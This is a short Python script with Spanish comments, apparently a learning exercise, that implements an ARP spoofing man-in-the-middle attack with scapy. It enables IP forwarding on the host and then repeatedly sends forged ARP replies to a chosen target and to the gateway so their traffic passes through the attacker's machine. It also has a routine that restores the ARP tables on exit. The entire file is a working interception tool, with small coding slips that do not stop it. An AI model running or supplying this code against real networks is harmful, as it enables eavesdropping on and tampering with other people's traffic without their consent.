from scapy.all import Ether, ARP, srp, send
from dotenv import load_dotenv
import time
import os

class ARPSpoofer:
    def __init__(self, target_ip, host_ip, verbose=True):
        self.target_id = target_ip
        self.host_ip = host_ip
        self.verbose = verbose
        self.habilitar_enrutamiento_ip()

    #Nos vamos a situar en medio de la comm entre maquina objetivo y gateway
    # Tenemos que activar un parámetro para permitir el reenvío, se encuentra en cat /proc/sys/net/ipv4/ip_forward
    # Tiene un vlaor default de 0. Para poder hacer el enrutamiento IP, debemos activarlo

    def habilitar_enrutamiento_ip(self):
        if self.verbose:
            print("habilitando enrutamiento ip")
        path = "/proc/sys/net/ipv4/ip_forward"
        with open(path) as file:
            if file.read() == 1:
                return
        
        with open(path, 'w') as file:
            print(1, file=file)

        if self.verbose:
            print('Enrutamiento activado')

    @staticmethod
    def obtener_mac(ip):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
        if ans:
            # mac de la maquina objetivo, que nos interesa envennear
            return ans[0][1].src
        
    #ip objetivo es a lo que le quiero pegar
    #ip anfitrion es la ip del gateway, del router
    def spoof(self, ip_objetivo, ip_anfitrion):
        mac_objetivo = self.obtener_mac(ip_objetivo)
        res_arp = ARP(
            pdst=ip_objetivo,
            hwdst=mac_objetivo,
            psrc=ip_anfitrion,
            op='is-at'
        )
        send(res_arp, verbose=0)
        if self.verbose:
            mac_propia = ARP().hwsrc
            print(f"Paquete ARP enviado a: {ip_objetivo}: {ip_anfitrion} está en {mac_propia}")

    def restaurar(self, ip_objetivo, ip_anfitrion):
        mac_objetivo = self.obtener_mac(ip_objetivo)
        mac_anfitrion = self.obtener_mac(ip_anfitrion)

        res_arp = ARP(
            pdst=ip_objetivo,
            hwdst=mac_objetivo,
            psrc=ip_anfitrion,
            hwsrc=mac_anfitrion,
            op='is-at'
        )
        send(res_arp, verbose=0, count=15)
        if self.verbose:
            mac_propia = ARP().hwsrc
            print(f"Restaurado {ip_objetivo}: {ip_anfitrion} está en {mac_propia}")

if __name__ == "__main__":
    objetivo = os.getenv("ARP_SPOOFING_TARGET_IP")
    gateway  = os.getenv("ARP_SPOOFING_GATEWAY_IP")

    spoofer = ARPSpoofer(objetivo, gateway)

    try:
        while True:
            spoofer.spoof(objetivo, gateway)
            spoofer.spoof(gateway, objetivo)
            time.sleep(1)
    except KeyboardInterrupt as ke:
        print(f"Deteniento ARP spoofing, restaurando la red")
        spoofer.restaurar(objetivo,gateway)
        spoofer.restaurar(gateway, objetivo)
